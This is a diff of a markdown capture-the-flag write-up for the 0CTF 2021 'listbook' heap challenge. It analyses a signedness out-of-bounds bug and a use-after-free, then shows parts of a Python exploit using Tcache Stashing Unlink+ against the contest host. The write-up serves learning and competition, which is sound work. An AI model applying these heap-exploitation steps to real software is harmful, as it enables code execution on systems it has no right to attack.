@@ -1,23 +1,35 @@
-﻿
+# listbook
 
-# 0ctf 2021
+- - -
 
-CTF : https://ctftime.org/event/1356
-Challenge : https://ctftime.org/writeup/29118
-Points: 154
+> CTF : https://ctftime.org/event/1356 <br>
+> Challenge : https://ctftime.org/writeup/29118 <br>
+> Points: 154 <br>
 
-# Checksec
+># Checksec
 
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-    RUNPATH:  './'
 
-# Overview
-It's a classic `libc 2.31` heap challenge
+
+- - -
+
+```yaml
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+RUNPATH:  './'
 ```
+
+># Overview
+
+
+
+- - -
+
+It's a classic `libc 2.31` heap challenge
+
+```ags
  _     _     _   ____              _    
 | |   (_)___| |_| __ )  ___   ___ | | __
 | |   | / __| __|  _ \ / _ \ / _ \| |/ /
@@ -30,11 +42,13 @@ It's a classic `libc 2.31` heap challenge
 3.show
 4.exit
 >>
-
 ```
+
 As shown in the options we can add , delete and show heap notes. Lets look at these functions in IDA now
+
 ### main
-```c
+
+```c 
 void main()
 {
   int option; // [rsp+Ch] [rbp-4h]
@@ -46,21 +60,23 @@ void main()
     option = print_options();
     switch(option)
     {
-	    case 1: add();
-		    break;
-	    case 2: remove();
-		    break;
-	    case 3: show();
-		    break;
-	    case 4: puts("bye!");
-		    exit(0);
-	    default: puts("invalid");
-		     break;
+        case 1: add();
+            break;
+        case 2: remove();
+            break;
+        case 3: show();
+            break;
+        case 4: puts("bye!");
+            exit(0);
+        default: puts("invalid");
+             break;
     }
   }
 }
 ```
+
 ### add
+
 ```c
 int add()
 {
@@ -82,7 +98,9 @@ int add()
   return puts("done");
 }
 ```
+
 ### remove
+
 ```c
 void __noreturn remove()
 {
@@ -112,7 +130,9 @@ void __noreturn remove()
   }
 }
 ```
+
 ### show
+
 ```c
 void __noreturn show()
 {
@@ -136,7 +156,9 @@ void __noreturn show()
   }
 }
 ```
+
 There is one more interesting function that is `gen_hash()` used in `add` function.
+
 ```c
 __int64 __fastcall gen_hash(heap_note *note, int size)
 {
@@ -153,13 +175,14 @@ __int64 __fastcall gen_hash(heap_note *note, int size)
   return idx;
 }
 ```
-This function seems pretty good isn't it. Now lets look the `abs8()` at it gdb.
-Lets give "A" as our name and step a breakpoint at 0x138f
+
+This function seems pretty good isn't it. Now lets look at the `abs8()` in gdb.
+Lets give "A" as our name and hit breakpoint at 0x138f
 ![enter image description here](https://imgur.com/oraDnOw.png)
 So everything is fine here right?. I bruteforced all values from 0x0 to 0xff and checked the returned value from the `gen_hash` function and saw something weird. Now lets give our `note->name` as "\x80"
-![enter image description here](https://imgur.com/3cgsgFO.png)
-So `al` is being right shifted by 7 and since `al` is being used instead of `eax` there is a signedness issue here. Lets follow the operations after the `sar` instruction
-```asm
+![enter image description here](https://imgur.com/3cgsgFO.png) <br> Lets see the disassembly of `abs8()`. <br> So `al` is being right shifted by 7 and since `al` is being used instead of `eax` there is a signedness issue here. Lets follow the operations after the `sar` instruction
+
+```c
 .text:000000000000138F ; 9:   sum = abs8(tmp);
 .text:000000000000138F                 movzx   eax, [rbp+tmp];
 .text:0000000000001393                 sar     al, 7; eax = 0x80 (before shift)
@@ -184,50 +207,45 @@ So `al` is being right shifted by 7 and since `al` is being used instead of `eax
 ```
 
 So there are two bugs. 
-1. UAF bug in `remove()` function	
-2. OOB in `gen_hash()` function
+
+* UAF bug in `remove()` function    
+* OOB in `gen_hash()` function
 
 Next i quickly wrote a fuzzer to allocate chunks randomly. And i got nice crashes. 
-1. Tcahce dup
-2. Unsorted bin corruption
+
+* Tcache dup
+* ( Unsorted / smallbin ) bin corruption
 
 [![asciicast](https://asciinema.org/a/459156.svg)](https://asciinema.org/a/459156)
 
-Now lets build our exploit.
-# Exploit
+Now lets build our exploit. <br> So with the OOB bug we can mark chunk idx 0 and 1 as in_use by creating a "\x80" named chunk. <br> When a "\x80" named chunk is created the heap address of this chunk gets overlapped with the address of `in_use` variable in bss.<br>
+
+```yaml
+pwndbg> x/gx $in_use
+0x555555558440: 0x0000000100000001 chunk 0 & 1 are in use
+0x555555558440: 0x000055555555c720 "\x80" chunk heap address overlapped
+```
+
+<br>So we can use this primitive for getting leaks and building our exploit.<br>
+
+># Exploit
+
+
+
+- - -
+
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
-2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.
-```py
+2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>
+
+```python
 #!/usr/bin/env python3.9
 # -*- coding: utf-8 -*-
-__MODE__ ="PWN"
 
 from rootkit import *
 exe = context.binary = ELF('./listbook')
 
 host = args.HOST or '111.186.58.249'
 port = int(args.PORT or 20001)
-
-def local(argv=[], *a, **kw):
-    '''Execute the target binary locally'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-def remote(argv=[], *a, **kw):
-    '''Connect to the process on the remote host'''
-    io = connect(host, port)
-    if args.GDB:
-        gdb.attach(io, gdbscript=gdbscript)
-    return io
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.LOCAL:
-        return local(argv, *a, **kw)
-    else:
-        return remote(argv, *a, **kw)
 
 gdbscript = '''
 tbreak main
@@ -278,7 +296,6 @@ reu(b"=> ")
 heap_base=uuu64(rl())-0x2d0
 hb=heap_base
 info(f"heap base : {hex(heap_base)}")
-# Rest if all Heap Feng Shui
 for i in range(8):
     add(b"\x08", b"X"*8)
 add(b"\x00", b"c"*8)
@@ -289,7 +306,7 @@ reu(b"=> ")
 reu(b"=> ")
 libc.address=uuu64(rl())-0x1ebbe0
 lb()
-
+# Rest is all Heap Feng Shui
 for i in range(2):
     add(b"\x09", b"X"*0x200)
 
@@ -311,12 +328,12 @@ delete(1) # trigger smallbin corruption overwrite fd & bk
 fd=hb+0x1790
 
 
-add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10 ) + (p(0x0) + p(0x31))*30) # 0x19d0
-add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10 ) + (p(0x0) + p(0x31))*30) # 0x2b10
-add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10 ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50
-add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10 ) + (p(0x0) + p(0x31))*30) # 0x2f90
-add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90) + p(hb+0x2f90) + b"e"*0x10 ) + (p(0x0) + p(0x31))*29) # 0x2c0
-add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10  ) ) # 0x1790
+add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
+add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
+add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10   ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50 libc.address+0x1ebde0 -> main_arena+608 to bypass check in _int_malloc+215
+add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10   )) # 0x2f90
+add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90)*2)) # 0x2c0
+add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10   )) # 0x1790
 
 # use tcache stashing unlink + to create overlapping chunks
 
@@ -329,5 +346,3 @@ delete(2)
 
 io.interactive()
 ```
-
-
